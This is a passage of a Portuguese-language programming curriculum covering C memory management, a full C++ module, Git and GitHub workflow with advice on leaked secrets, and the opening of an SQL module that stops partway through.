Os três erros clássicos:

1. **Memory leak** — alocou e não liberou
2. **Dangling pointer** — usou depois do `free`
3. **Double free** — liberou duas vezes

Use `valgrind ./programa` para detectar todos os três.

### Aula 6.10 — Stack e Heap

Duas regiões de memória, e entender a diferença explica metade dos bugs de C:

| | Stack (pilha) | Heap (monte) |
|---|---|---|
| O que guarda | Variáveis locais | O que você aloca com `malloc` |
| Gerenciamento | Automático | Manual (`free`) |
| Velocidade | Muito rápida | Mais lenta |
| Tamanho | Pequeno e limitado | Grande |
| Tempo de vida | Morre ao sair da função | Vive até você liberar |

Erro clássico — devolver endereço de variável local:

```c
int* errado() {
    int x = 42;
    return &x;      // x morre quando a função acaba. Ponteiro inválido.
}

int* certo() {
    int *x = malloc(sizeof(int));
    *x = 42;
    return x;       // vive no heap, sobrevive. Quem chamou precisa dar free.
}
```

### Aula 6.11 — Arquivos e múltiplos arquivos

```c
FILE *arquivo = fopen("dados.txt", "r");   // "r" ler, "w" escrever, "a" acrescentar

if (arquivo == NULL) {
    printf("Erro ao abrir\n");
    return 1;
}

char linha[100];
while (fgets(linha, sizeof(linha), arquivo) != NULL) {
    printf("%s", linha);
}

fclose(arquivo);       // sempre feche
```

Organizando projeto grande:

```c
/* matematica.h — a interface */
#ifndef MATEMATICA_H
#define MATEMATICA_H
int somar(int a, int b);
#endif

/* matematica.c — a implementação */
#include "matematica.h"
int somar(int a, int b) { return a + b; }

/* main.c */
#include "matematica.h"
```

```bash
gcc -Wall main.c matematica.c -o programa
```

O `#ifndef / #define / #endif` é a *include guard* — evita que o mesmo cabeçalho seja incluído duas vezes.

---

## Projetos do Módulo 6

**Projeto 1 — Sistema de cadastro com structs e arquivos**
Cadastro de alunos: adicionar, listar, buscar, editar, remover, salvar e carregar de arquivo binário. Memória alocada dinamicamente conforme cresce.

**Projeto 2 — Lista encadeada do zero**
Implemente uma lista ligada com inserção no início, no fim e no meio, remoção e busca. Este projeto é o exame final de ponteiros. Se você conseguir, você entendeu memória.

**Projeto 3 — Algoritmos clássicos**
Implemente bubble sort, insertion sort, selection sort, quick sort, busca linear e busca binária. Meça o tempo de cada um com vetores de 1.000, 10.000 e 100.000 elementos e compare.

---

## Checklist de saída do Módulo 6

- [ ] Explico a diferença entre `&x` e `*p`
- [ ] Explico passagem por valor vs. por referência com exemplo próprio
- [ ] Sei por que string em C precisa do `\0`
- [ ] Uso `malloc` e `free` sem vazar (confirmado com valgrind)
- [ ] Explico a diferença entre stack e heap
- [ ] Minha lista encadeada funciona e não vaza memória

---

# MÓDULO 7 — C++

> **Dificuldade:** ●●●●● · **Tempo:** 12 a 16 semanas · **Pré-requisito:** Módulo 6

**Objetivo:** dominar orientação a objetos de verdade, gerenciamento moderno de recursos e abstrações de alto nível sem perder desempenho.

C++ é a linguagem mais complexa deste material. Ela contém C inteiro dentro dela, mais orientação a objetos, mais templates, mais uma biblioteca padrão enorme. Ninguém sabe C++ inteiro — nem quem o criou.

**Estratégia:** aprenda **C++ moderno** (a partir do padrão C++11). Muito material antigo ensina práticas dos anos 90 que hoje são consideradas erradas.

```bash
g++ -std=c++17 -Wall -Wextra programa.cpp -o programa
```

---

## Nível Básico

### Aula 7.1 — O que muda em relação a C

```cpp
#include <iostream>
#include <string>

int main() {
    std::string nome;

    std::cout << "Seu nome: ";
    std::cin >> nome;
    std::cout << "Olá, " << nome << std::endl;

    return 0;
}
```

Diferenças imediatas:

- `std::cout` e `std::cin` em vez de `printf`/`scanf` — sem especificadores de formato, sem `&`
- `std::string` em vez de `char[]` — cresce sozinha, não precisa de `\0`
- `<<` e `>>` são operadores sobrecarregados

Sobre o `using namespace std;` que você vai ver em todo tutorial: **não use em arquivo de cabeçalho** e evite em projetos grandes. Ele traz milhares de nomes para o escopo global e causa conflitos difíceis de rastrear. Escrever `std::` é chato mas é o certo.

### Aula 7.2 — Referências

C++ adiciona um terceiro jeito de passar dados, mais seguro que ponteiro:

```cpp
void dobrar(int &n) {      // & no parâmetro = referência
    n = n * 2;
}

int x = 5;
dobrar(x);                 // sem & na chamada — mais limpo que C
// x agora é 10
```

Referência é um **apelido** para a variável original. Diferenças para ponteiro:

- Não pode ser nula
- Não pode ser reapontada
- Não precisa de `*` para usar

**Passe objetos grandes por referência constante** — evita a cópia e garante que a função não modifica:

```cpp
void mostrar(const std::string &texto) {
    std::cout << texto;
}
```

### Aula 7.3 — Sobrecarga e valores padrão

```cpp
int somar(int a, int b) { return a + b; }
double somar(double a, double b) { return a + b; }        // mesmo nome, tipos diferentes
int somar(int a, int b, int c) { return a + b + c; }

void desenhar(int largura, int altura = 10) { }
```

C não permite isso. C++ escolhe a função certa pelos tipos dos argumentos.

---

## Nível Intermediário

### Aula 7.4 — Classes e os quatro pilares

```cpp
class ContaBancaria {
private:
    std::string titular;
    double saldo;

public:
    // Construtor com lista de inicialização
    ContaBancaria(std::string t, double s = 0)
        : titular(t), saldo(s) {}

    // Destrutor: chamado quando o objeto morre
    ~ContaBancaria() {}

    void depositar(double valor) {
        if (valor <= 0) throw std::invalid_argument("Valor inválido");
        saldo += valor;
    }

    double getSaldo() const { return saldo; }   // const = não modifica o objeto
};
```

**Os quatro pilares da orientação a objetos:**

**1. Encapsulamento** — esconder o interior, expor só o necessário.

```cpp
private:    // só a própria classe acessa
protected:  // a classe e suas filhas
public:     // qualquer um
```

O saldo é `private` justamente para ninguém fazer `conta.saldo = 1000000`. Toda mudança passa por `depositar`, que valida.

**2. Herança** — uma classe aproveita outra.

```cpp
class ContaPoupanca : public ContaBancaria {
private:
    double taxaJuros;
public:
    ContaPoupanca(std::string t, double s, double taxa)
        : ContaBancaria(t, s), taxaJuros(taxa) {}

    void renderJuros() { depositar(getSaldo() * taxaJuros); }
};
```

**3. Polimorfismo** — o mesmo comando produz comportamentos diferentes.

```cpp
class Animal {
public:
    virtual void falar() const { std::cout << "..."; }
    virtual ~Animal() = default;      // destrutor virtual: obrigatório na classe base
};

class Cachorro : public Animal {
public:
    void falar() const override { std::cout << "Au au!"; }
};

class Gato : public Animal {
public:
    void falar() const override { std::cout << "Miau!"; }
};

void fazerFalar(const Animal &a) { a.falar(); }
// A mesma função funciona com qualquer animal, e cada um fala do seu jeito
```

A palavra `virtual` é o que ativa isso. Sem ela, `fazerFalar` chamaria sempre a versão de `Animal`. O `override` não é obrigatório mas peça ao compilador para conferir que você realmente sobrescreveu algo — pega erro de digitação.

**4. Abstração** — definir o "o quê" sem o "como".

```cpp
class Forma {
public:
    virtual double area() const = 0;    // = 0 torna a função PURA
    virtual ~Forma() = default;
};
// Forma agora é abstrata: não dá para criar um objeto Forma.
// Toda classe filha é OBRIGADA a implementar area().
```

### Aula 7.5 — A STL (biblioteca padrão)

Aqui C++ recompensa você por ter sofrido com C. Tudo que você implementou na mão já vem pronto e otimizado.

```cpp
#include <vector>
#include <map>
#include <set>
#include <algorithm>

// vector — array que cresce sozinho
std::vector<int> nums = {5, 3, 8, 1};
nums.push_back(10);
nums.size();
for (int n : nums) { }                    // for range-based

// map — dicionário ordenado por chave
std::map<std::string, int> idades;
idades["Ana"] = 30;
if (idades.count("Ana")) { }

// unordered_map — mais rápido, sem ordem
std::unordered_map<std::string, int> rapido;

// set — sem repetidos
std::set<int> unicos = {1, 2, 2, 3};      // fica {1,2,3}

// algorithms
std::sort(nums.begin(), nums.end());
std::sort(nums.begin(), nums.end(), [](int a, int b) { return a > b; });  // decrescente
auto it = std::find(nums.begin(), nums.end(), 8);
int total = std::accumulate(nums.begin(), nums.end(), 0);
```

Aquele `[](int a, int b) { return a > b; }` é uma **lambda** — função anônima, igual à arrow function do JavaScript e ao `lambda` do Python. Repare como os conceitos se repetem entre linguagens; só muda a roupa.

---

## Nível Avançado

### Aula 7.6 — Templates

Escrever código que funciona com qualquer tipo, sem duplicar:

```cpp
template <typename T>
T maximo(T a, T b) {
    return (a > b) ? a : b;
}

maximo(3, 7);          // funciona com int
maximo(2.5, 1.8);      // funciona com double
maximo<std::string>("a", "b");
```

```cpp
template <typename T>
class Caixa {
private:
    T conteudo;
public:
    void guardar(const T &item) { conteudo = item; }
    T pegar() const { return conteudo; }
};

Caixa<int> caixaInt;
Caixa<std::string> caixaTexto;
```

O `std::vector<int>` que você usou é exatamente isso: um template instanciado com `int`. A STL inteira é feita de templates.

### Aula 7.7 — Gerenciamento moderno de memória

Este é o assunto mais importante do C++ moderno.

**RAII** (*Resource Acquisition Is Initialization*): o recurso é adquirido no construtor e liberado no destrutor. Como o destrutor é chamado automaticamente quando o objeto sai de escopo, o recurso nunca vaza — nem se der exceção.

**Ponteiros inteligentes** aplicam RAII à memória:

```cpp
#include <memory>

// unique_ptr — um único dono. Libera sozinho.
std::unique_ptr<int> p1 = std::make_unique<int>(42);
// não precisa de delete

// shared_ptr — vários donos, conta referências. Libera quando o último sai.
std::shared_ptr<int> p2 = std::make_shared<int>(42);
std::shared_ptr<int> p3 = p2;      // agora são 2 donos

// weak_ptr — observa sem contar como dono. Quebra referência circular.
std::weak_ptr<int> p4 = p2;
```

**Regra do C++ moderno:** você não deve escrever `new` nem `delete` no seu código de aplicação. Use `make_unique`, `make_shared` e containers da STL. Isso elimina de uma vez a categoria inteira de bugs que você penou para evitar em C.

```cpp
// Estilo antigo, propenso a vazamento
Animal *a = new Cachorro();
delete a;                      // se der exceção antes daqui, vazou

// Estilo moderno
auto a = std::make_unique<Cachorro>();
// libera sozinho, aconteça o que acontecer
```

### Aula 7.8 — Exceções

```cpp
#include <stdexcept>

double dividir(double a, double b) {
    if (b == 0) throw std::runtime_error("Divisão por zero");
    return a / b;
}

int main() {
    try {
        std::cout << dividir(10, 0);
    }
    catch (const std::runtime_error &e) {
        std::cerr << "Erro: " << e.what() << std::endl;
    }
    catch (const std::exception &e) {
        std::cerr << "Erro genérico: " << e.what() << std::endl;
    }
    return 0;
}
```

Capture sempre por **referência constante** (`const &`) — capturar por valor faz cópia e pode fatiar o objeto de exceção.

### Aula 7.9 — Recursos que valem conhecer

```cpp
// auto — o compilador deduz o tipo
auto x = 42;
auto it = vetor.begin();

// Move semantics — transfere em vez de copiar (rápido para objetos grandes)
std::vector<int> v2 = std::move(v1);   // v1 fica vazio, nada foi copiado

// constexpr — calculado em tempo de compilação
constexpr int quadrado(int n) { return n * n; }
constexpr int resultado = quadrado(5);   // já vale 25 no executável

// Estruturas com nome (C++17)
auto [chave, valor] = *mapa.begin();     // igual à desestruturação do JS
```

---

## Projetos do Módulo 7

**Projeto 1 — Sistema com hierarquia de classes**
Sistema de biblioteca ou de folha de pagamento. Classe base abstrata, no mínimo três classes derivadas, polimorfismo real, uso de STL, ponteiros inteligentes, exceções para regras de negócio.

**Projeto 2 — Estruturas de dados genéricas com template**
Implemente sua própria `Pilha<T>`, `Fila<T>` e `ListaLigada<T>`. Compare com as versões da STL. Aqui você entende o que a STL faz por você.

**Projeto 3 — Aplicação de porte real**
Um jogo simples (tabuleiro, batalha naval) ou um interpretador de calculadora com precedência de operadores. Múltiplos arquivos, compilado com Makefile ou CMake, com testes.

---

## Checklist de saída do Módulo 7

- [ ] Explico os quatro pilares com exemplo em código meu
- [ ] Sei por que a classe base precisa de destrutor virtual
- [ ] Sei a diferença entre `unique_ptr` e `shared_ptr`
- [ ] Escrevo função e classe template
- [ ] Explico RAII e por que ele elimina vazamento
- [ ] Não escrevo `new`/`delete` no meu código
- [ ] Uso `vector`, `map` e `sort` sem consultar

---

# MÓDULO 8 — Git e GitHub

> **Dificuldade:** ●●○○○ · **Tempo:** 3 a 4 semanas · **Pré-requisito:** nenhum *(comece junto com o Módulo 1)*

**Objetivo:** versionar seu código com segurança, trabalhar em equipe sem sobrescrever ninguém, e construir o portfólio que vai te dar entrevista.

Git não é matéria de faculdade nem enfeite de currículo: é a ferramenta que você vai usar **todo dia**, em toda vaga, pelo resto da carreira. E o GitHub é onde o recrutador vai olhar antes de te chamar.

**Comece agora, no seu primeiro projeto de HTML.** Não espere "ter algo digno". Um GitHub com commits regulares há dois anos vale mais numa entrevista que qualquer certificado — porque mostra constância, que é justamente o que ninguém consegue fingir.

Este módulo é curto e você vai voltar a ele. Leia as Aulas 8.1 a 8.5 antes do Módulo 1, e o resto quando começar a trabalhar em equipe.

**Ferramentas:** [Git](https://git-scm.com/) instalado, uma conta no [GitHub](https://github.com/), e o terminal. Resista à tentação de usar só a interface gráfica no começo — ela esconde o modelo mental que você precisa construir.

---

## Nível Básico

### Aula 8.1 — O problema que o Git resolve

Você já fez isso:

```
projeto_final.html
projeto_final_v2.html
projeto_final_v2_CORRIGIDO.html
projeto_final_ESSE_QUE_FUNCIONA.html
projeto_final_ESSE_QUE_FUNCIONA_agora_vai.html
```

Todo mundo fez. E todo mundo já perdeu trabalho porque sobrescreveu o arquivo errado, ou porque quebrou algo e não lembrava como estava antes.

**Git é uma máquina do tempo para o seu projeto.** Ele guarda o estado completo em cada ponto que você marcar, e permite voltar a qualquer um deles. Além disso, deixa duas pessoas mexerem no mesmo projeto ao mesmo tempo sem uma apagar a outra.

Duas palavras que as pessoas confundem:

- **Git** é o programa que roda na sua máquina, controlando as versões. Funciona sem internet.
- **GitHub** é um site que hospeda repositórios Git. É onde você publica, colabora e monta portfólio. Existem outros (GitLab, Bitbucket).

Dá para usar Git sem GitHub. O contrário, não.

### Aula 8.2 — O modelo mental: três áreas

Esta é a aula que decide se Git vai fazer sentido ou parecer magia. **Leia com atenção.**

Git tem três áreas, e todo comando é um movimento entre elas:

```
   Diretório de           Área de              Repositório
    trabalho             preparação            (histórico)
  (seus arquivos)         (staging)
        │                     │                     │
        │  ── git add ──────► │                     │
        │                     │  ── git commit ───► │
        │                     │                     │
        │ ◄──────────── git checkout / restore ─────│
```

- **Diretório de trabalho** — os arquivos como estão agora no seu computador
- **Área de preparação** — o que você **escolheu** incluir no próximo commit
- **Repositório** — o histórico permanente, dentro da pasta `.git`

Por que existe a área do meio? Porque nem tudo que você mexeu pertence à mesma mudança. Se você corrigiu um bug **e** mudou uma cor, isso são dois commits — e a área de preparação deixa você separá-los, mesmo estando os dois no disco ao mesmo tempo.

**Commit** é uma fotografia do projeto inteiro naquele instante, com autor, data, mensagem e um identificador único (um `hash` como `a3f9c21`).

Veja as três áreas de verdade:

```bash
git status
```

```
Changes to be committed:        ← área de preparação (já passou pelo add)
        modified:   index.html

Changes not staged for commit:  ← diretório de trabalho (mexeu, não adicionou)
        modified:   estilo.css

Untracked files:                ← Git nunca viu esse arquivo
        foto.jpg
```

**Use `git status` o tempo todo.** É a bússola. Quando estiver perdido, ele te diz onde você está e o que fazer — literalmente, porque sugere os comandos.

### Aula 8.3 — O ciclo básico

Noventa por cento do seu uso de Git são estes comandos:

```bash
git init                      # cria o repositório (só na primeira vez)

git status                    # o que mudou?
git add index.html            # prepara um arquivo
git add .                     # prepara tudo que mudou
git commit -m "Adiciona formulário de contato"

git log --oneline             # histórico resumido
git diff                      # o que mudou e ainda não foi preparado
git diff --staged             # o que está preparado para o commit
```

**A mensagem de commit importa mais do que parece.** Você vai ler esse histórico procurando quando algo quebrou. Compare:

```
ruim:  "ajustes"
ruim:  "correções"
ruim:  "asdf"
bom:   "Corrige cálculo de frete para pedidos acima de R$ 200"
```

A convenção que funciona: **verbo no presente, dizendo o que a mudança faz**. "Adiciona", "Corrige", "Remove", "Atualiza". Leia como se completasse a frase *"Ao aplicar este commit, o projeto vai…"*.

**Commit pequeno e frequente bate commit gigante.** Um commit com uma mudança é fácil de entender, fácil de reverter e fácil de revisar. Um commit com 40 arquivos e três assuntos diferentes não dá para desfazer sem levar junto o que estava bom.

### Aula 8.4 — Desfazer: as três situações

Aqui a maioria trava, porque os comandos parecem intercambiáveis e não são. A pergunta que resolve: **onde está a coisa que quero desfazer?**

**Situação 1 — Mexi no arquivo e quero descartar (ainda não fiz `add`)**

```bash
git restore index.html        # descarta as mudanças desse arquivo
git restore .                 # descarta tudo
```

Isso **apaga seu trabalho sem volta**. É o único comando desta aula que destrói algo de verdade.

**Situação 2 — Fiz `add` e quero tirar da área de preparação**

```bash
git restore --staged index.html    # volta para "modificado", sem perder a edição
```

**Situação 3 — Já fiz o commit**

```bash
git commit --amend -m "Mensagem certa"   # corrige o ÚLTIMO commit (só se não subiu)

git revert a3f9c21     # cria um commit NOVO que desfaz aquele — seguro, mantém histórico
git reset --soft HEAD~1   # desfaz o commit, guarda as mudanças preparadas
git reset --hard HEAD~1   # desfaz o commit E APAGA as mudanças — perigoso
```

**`revert` contra `reset`, e por que isso importa:**

| | Faz | Use quando |
|---|-----|-----------|
| `revert` | Acrescenta um commit que desfaz | **Sempre que o commit já foi para o remoto** |
| `reset` | Reescreve o histórico, apagando commits | Só em commit que ainda está local |

Reescrever histórico que outras pessoas já baixaram quebra o repositório delas. A regra: **`reset` só no que ninguém viu; `revert` no resto.**

**A rede de segurança que quase ninguém conhece:**

```bash
git reflog
```

Ele lista tudo por onde o repositório passou, inclusive commits que você "apagou" com `reset --hard`. Enquanto o Git não fizer limpeza (semanas), **dá para recuperar**. Se você já achou que perdeu tudo, tente isto antes de entrar em pânico.

### Aula 8.5 — .gitignore, e o que nunca versionar

Nem tudo entra no repositório:

```gitignore
# Dependências — reinstaláveis, e pesam gigabytes
node_modules/
venv/
__pycache__/

# Segredos — NUNCA
.env
*.key
credenciais.json

# Gerados pelo build
dist/
build/
*.class

# Do sistema e do editor
.DS_Store
.vscode/
```

**Segredo em repositório é o acidente mais caro que um iniciante comete.** Chave de API, senha de banco, token — vazou uma vez, vazou para sempre.

E aqui está a parte que pega todo mundo: **apagar o arquivo depois não resolve.** O Git guarda o histórico. Se a chave entrou no commit de terça, ela continua lá, visível para qualquer um que rode `git log -p`, mesmo que você a tenha removido na quarta.

Robôs varrem o GitHub procurando exatamente isso, e encontram em **minutos**. Já houve conta de nuvem com prejuízo de dezenas de milhares de reais por chave vazada em repositório público.

**Se acontecer com você**, nesta ordem:

1. **Invalide a chave imediatamente** no painel do provedor. Isso é o que importa — o resto é limpeza.
2. Gere uma nova
3. Só então limpe o histórico (`git filter-repo`) — e saiba que se o repositório é público, presuma que já foi copiado

Crie o `.gitignore` **antes** do primeiro commit. O GitHub oferece modelos prontos por linguagem quando você cria o repositório; use.

---

## Nível Intermediário

### Aula 8.6 — Branches

Uma **branch** é uma linha de desenvolvimento paralela. Ela permite mexer numa funcionalidade nova sem tocar no código que está funcionando.

```bash
git branch                          # lista as branches; a atual tem *
git switch -c nova-funcionalidade   # cria e vai para ela
git switch main                     # volta para a principal

git branch -d nova-funcionalidade   # apaga (depois de mesclar)
```

*(`git checkout -b` faz o mesmo que `git switch -c`. O `switch` é mais novo e mais claro — `checkout` fazia coisas demais.)*

Visualmente:

```
main       A───B───C───────────F
                    \         /
funcionalidade       D───E───┘
                          (merge)
```

Você saiu de `C`, fez `D` e `E` em paralelo, e depois juntou tudo em `F`. Enquanto isso, `main` continuou funcionando o tempo todo.

**Mesclando** — e repare na ordem, que é onde todo mundo erra:

```bash
git switch main                     # 1. vá para onde quer RECEBER
git merge nova-funcionalidade       # 2. traga a outra para cá
```

Merge traz mudança **para** a branch onde você está. Estar na branch errada nesta hora é o erro mais comum do módulo: rodar `git merge minha-funcionalidade` estando **nela** não faz nada e devolve `Already up to date` — porque você mandou juntá-la com ela mesma.

**Por que usar branch mesmo sozinho:** você tenta uma ideia arriscada sem medo. Deu errado, apaga a branch e nada aconteceu com a `main`. Deu certo, mescla.

### Aula 8.7 — Conflito de merge

Duas pessoas mudaram **a mesma linha do mesmo arquivo**. O Git não tem como adivinhar qual vale, então para e pede sua decisão.

Conflito **não é erro**. É rotina. O que assusta é a aparência:

```
<<<<<<< HEAD
    <h1>Bem-vindo à nossa loja</h1>
=======
    <h1>Bem-vindo ao nosso site</h1>
>>>>>>> nova-funcionalidade
```

Traduzindo os marcadores:

- Entre `<<<<<<< HEAD` e `=======` está **a sua versão** (a da branch em que você está)
- Entre `=======` e `>>>>>>>` está **a versão que chegou**

Resolver é editar o arquivo até ficar como deve ficar — **apagando as três linhas de marcador**. Você pode escolher um lado, o outro, ou escrever algo novo que combine os dois.

```bash
# 1. veja quais arquivos estão em conflito
git status

# 2. abra cada um, edite, apague os marcadores <<<<<<< ======= >>>>>>>

# 3. marque como resolvido
git add index.html

# 4. conclua
git commit
```

Se entrar em pânico no meio:

```bash
git merge --abort      # cancela tudo e volta ao estado anterior
```

**Como ter menos conflito:** commits pequenos, branches de vida curta, e `git pull` com frequência. Conflito nasce de duas pessoas trabalhando dias isoladas na mesma região do código.

### Aula 8.8 — Trabalhando com o remoto

**Remoto** é o repositório hospedado — no GitHub, normalmente. `origin` é o apelido padrão dele.

```bash
# Começando do seu computador
git remote add origin https://github.com/usuario/repo.git
git push -u origin main        # o -u só na primeira vez

# Começando de um projeto que já existe
git clone https://github.com/usuario/repo.git

# No dia a dia
git push                       # envia seus commits
git pull                       # traz e mescla os commits dos outros
git fetch                      # traz, mas NÃO mescla — só para olhar
```

**`pull` é `fetch` + `merge`.** Quando quiser só ver o que mudou sem mexer no seu código, use `fetch` e depois `git log origin/main`.

**O hábito que evita a maior parte da dor:** dê `git pull` **antes** de começar a trabalhar, todo dia. Assim você parte do estado atual e conflita menos.

Se o `push` for recusado com *"updates were rejected"*, significa que alguém publicou algo que você não tem. A saída não é forçar:

```bash
git pull        # traz o que falta e resolve conflito, se houver
git push        # agora sim
```

**Nunca use `git push --force` em branch compartilhada.** Ele apaga o trabalho dos outros do servidor. Se realmente precisar (numa branch sua, depois de um rebase), use `--force-with-lease`, que recusa a operação caso alguém tenha publicado algo desde sua última leitura.

---

## Nível Avançado

### Aula 8.9 — Pull request e revisão de código

É assim que se trabalha em equipe de verdade. Ninguém commita direto na `main` em projeto sério.

```
1. git switch -c corrige-calculo-frete
2. trabalha, faz commits pequenos
3. git push -u origin corrige-calculo-frete
4. Abre o Pull Request no GitHub
5. Alguém revisa e comenta
6. Você ajusta e faz push de novo (o PR atualiza sozinho)
7. Aprovado → merge → apaga a branch
```

**Pull Request** (ou *Merge Request*, no GitLab) é um pedido: *"revisem estas mudanças antes de entrarem na `main`"*. É onde acontece a revisão de código, e é a prática que mais melhora um time — e você.

**Branch protegida** é o que transforma essa combinação em regra, e não em promessa. No GitHub, em `Settings > Branches > Add rule`, você marca a `main` e exige, por exemplo:

- Pull Request obrigatório — ninguém dá `push` direto nela, nem quem criou o repositório
- Pelo menos uma aprovação antes do merge
- Verificações automáticas passando (é o gancho que o Módulo 11 vai usar)

Sem isso, "não commitamos direto na `main`" depende de todo mundo lembrar, sempre, inclusive na sexta às sete da noite. Com isso, o servidor recusa. **Ligue no seu projeto pessoal também** — você é o time inteiro, e é você quem vai esquecer.

**Como escrever um PR que é aprovado rápido:**

- **Pequeno.** Um PR de 50 linhas recebe revisão cuidadosa; um de 2.000 recebe "aprovado" sem ninguém ler.
- **Uma coisa só.** Correção de bug e refatoração no mesmo PR obrigam o revisor a separar o que é o quê.
- **Descreva o porquê.** O diff já mostra *o que* mudou; escreva *por que* precisava mudar.
- **Revise você antes.** Leia seu próprio diff no GitHub antes de pedir revisão. Você vai achar coisa.

**Recebendo crítica:** revisão é sobre o código, não sobre você. Todo sênior já teve PR devolvido cheio de comentário. Quem aprende rápido é quem trata comentário como informação, não como ataque.

**Fazendo revisão:** aponte o problema e sugira o caminho. "Isso está errado" não ajuda; "esse laço fica O(n²) com a lista grande, dá para usar um dicionário aqui" ajuda.

### Aula 8.10 — Rebase, stash e histórico legível

**Stash** — guarda o trabalho pela metade sem fazer commit:

```bash
git stash              # guarda e limpa o diretório de trabalho
git stash list         # o que está guardado
git stash pop          # traz de volta e remove da pilha
```

Serve para a situação clássica: você está no meio de algo e precisa trocar de branch **agora** para corrigir uma urgência.

**Rebase** — reescreve seus commits como se tivessem partido de outro ponto:

```
Antes:                      Depois de rebase:
main    A───B───C           main    A───B───C
             \                               \
minha         D───E         minha             D'──E'
```

```bash
git switch minha-funcionalidade
git rebase main
```

`merge` cria um commit de junção e preserva a ramificação. `rebase` reaplica seus commits em cima da `main`, deixando o histórico numa linha reta — mais fácil de ler.

**A regra de ouro do rebase:** *nunca reescreva histórico que já foi publicado e que outras pessoas podem ter baixado.* Rebase em branch sua, antes do push, é ótimo. Rebase na `main` compartilhada quebra o repositório de todo mundo.

**Rebase interativo** — limpar seus commits antes de abrir o PR:

```bash
git rebase -i HEAD~4       # trabalha nos últimos 4 commits
```

Abre um editor onde você pode juntar (`squash`), renomear (`reword`), reordenar ou apagar commits. É como transformar "wip", "wip2", "agora vai" e "corrige typo" em um único commit bem descrito.

### Aula 8.11 — GitHub como portfólio

Aqui o módulo deixa de ser sobre ferramenta e passa a ser sobre carreira.

**O que o recrutador olha, na ordem:**

1. **Tem projeto próprio?** Ou só fork e exercício de curso?
2. **Tem README?** Repositório sem README parece abandonado.
3. **Os commits são regulares?** Ou tudo foi enviado num dia só?
4. **As mensagens de commit fazem sentido?**
5. **O projeto roda?** Tem link de demonstração?

**Um README que funciona** tem: o que o projeto faz, uma captura de tela ou link ao vivo, como rodar localmente, e as tecnologias usadas. Quinze linhas resolvem — o pecado é não ter nenhuma.

**O que vale mais que quantidade:** três projetos terminados, com README e no ar, valem mais que trinta repositórios pela metade. Isso é o mesmo princípio do material inteiro — projeto terminado é a única prova.

**GitHub Pages** publica site estático de graça, direto do repositório: em `Settings > Pages`, escolha a branch, e seu projeto ganha uma URL pública. Para o currículo do Módulo 1 e a landing page do Módulo 2, é o caminho mais curto entre "está no meu computador" e "está no ar".

**Contribuir com projeto aberto** é opcional, mas pesa. Comece pequeno: corrigir erro na documentação é contribuição legítima, e te ensina o fluxo de PR num projeto real.

---

## Projetos do Módulo 8

**Projeto 1 — Versione o que você já fez**
Pegue seu currículo do Módulo 1 e a landing page do Módulo 2. Crie um repositório para cada, com `.gitignore` e README de verdade, e publique no GitHub Pages. Faça pelo menos dez commits com mensagens descritivas — não um commit gigante com tudo.

**Projeto 2 — Simule o trabalho em equipe**
No mesmo repositório: crie uma branch, mude o `<h1>` nela; volte para a `main` e mude a **mesma linha** de outro jeito; tente mesclar. **Provoque o conflito de propósito** e resolva-o pelo terminal. Depois pratique `revert`, `reset --soft` e recupere um commit "perdido" com `reflog`. É melhor descobrir tudo isso agora, sozinho, do que no primeiro dia de emprego.

**Projeto 3 — Fluxo profissional completo**
Repositório com `main` protegida. Cada funcionalidade nasce em branch, sobe por Pull Request com descrição decente, e só entra depois de você mesmo revisar o diff. Use `rebase -i` para limpar os commits antes de abrir o PR. Faça isso em pelo menos três funcionalidades.

---

## Checklist de saída do Módulo 8

- [ ] Explico as três áreas do Git e o que cada comando move entre elas
- [ ] Escrevo mensagens de commit que descrevem a mudança
- [ ] Sei desfazer nas três situações: antes do add, depois do add, depois do commit
- [ ] Sei a diferença entre `revert` e `reset`, e quando cada um é seguro
- [ ] Crio branch, mesclo e sei em qual branch preciso estar na hora do merge
- [ ] Resolvo conflito pelo terminal sem entrar em pânico
- [ ] Sei por que apagar um segredo depois não resolve, e o que fazer se vazar
- [ ] Abro Pull Request com descrição que explica o porquê
- [ ] Tenho pelo menos três projetos no GitHub, com README e no ar

---

# MÓDULO 9 — SQL e Bancos de Dados

> **Dificuldade:** ●●●○○ · **Tempo:** 8 a 10 semanas · **Pré-requisito:** Módulo 4 *(pode começar junto com ele)*

**Objetivo:** guardar, consultar e relacionar dados de verdade — e saber por que sua consulta está lenta.

Toda aplicação séria guarda dados em banco. Você já viu como ler e escrever arquivo em Python; banco de dados é o que se usa quando o arquivo deixa de dar conta — quando várias pessoas escrevem ao mesmo tempo, quando você precisa achar um registro entre um milhão, quando não pode perder nada se a luz cair.

SQL tem uma característica que nenhuma linguagem deste material tem: **você diz o que quer, não como fazer**. Em Python você escreve o laço que percorre a lista. Em SQL você descreve o resultado e o banco decide como chegar lá. Isso se chama linguagem *declarativa*, e é a razão de SQL ter sobrevivido cinquenta anos praticamente igual.

**Aprenda SQL antes de qualquer ORM.** O ORM (Django ORM, Hibernate, SQLAlchemy) escreve SQL por você. Sem entender o que ele gera, você não sabe depurar consulta lenta nem explicar o que seu próprio código faz.

**Ferramentas:** comece com [SQLite](https://sqlite.org/) — é um arquivo, não exige instalar servidor, e o Python já vem com ele. Depois passe para [PostgreSQL](https://www.postgresql.org/), que é o padrão do mercado. Para visualizar, use [DBeaver](https://dbeaver.io/) ou a extensão SQLite do VS Code.

---

## Nível Básico

### Aula 9.1 — Por que não guardar tudo em arquivo

Você já sabe salvar dados em JSON ou CSV. Por que não parar por aí?

| Problema | Arquivo | Banco de dados |
|----------|---------|----------------|
| Achar um registro entre 1 milhão | Lê o arquivo inteiro | Índice acha em milissegundos |
| Duas pessoas gravando junto | Uma sobrescreve a outra | Controle de concorrência |
| Luz cai no meio da gravação | Arquivo corrompido | Transação desfaz pela metade |
| Garantir que não há CPF repetido | Você escreve a checagem | O banco recusa sozinho |
| Relacionar pedido com cliente | Você programa a junção | `JOIN` |

Nada impede você de resolver tudo isso na mão. O banco de dados **é** essa solução, escrita por gente que passou décadas nela.

### Aula 9.2 — O modelo relacional

Um banco relacional é um conjunto de **tabelas**. Uma tabela parece uma planilha, mas com regras:

```
      ┌──────────────── tabela: clientes ────────────────┐
      │  id  │      nome      │       email       │ uf  │  ← colunas (campos)
      ├──────┼────────────────┼───────────────────┼─────┤
      │  1   │ Ana Souza      │ ana@exemplo.com   │ CE  │  ← linha (registro)
      │  2   │ Carlos Lima    │ carlos@exemplo.com│ RN  │
      └──────┴────────────────┴───────────────────┴─────┘
```

Três ideias que mudam tudo em relação a uma planilha:

- **Coluna tem tipo.** Se `id` é inteiro, não entra texto ali. Nunca.
- **Linha tem identidade.** A coluna `id` é a **chave primária**: única, nunca nula, é como você aponta para aquela linha exata.
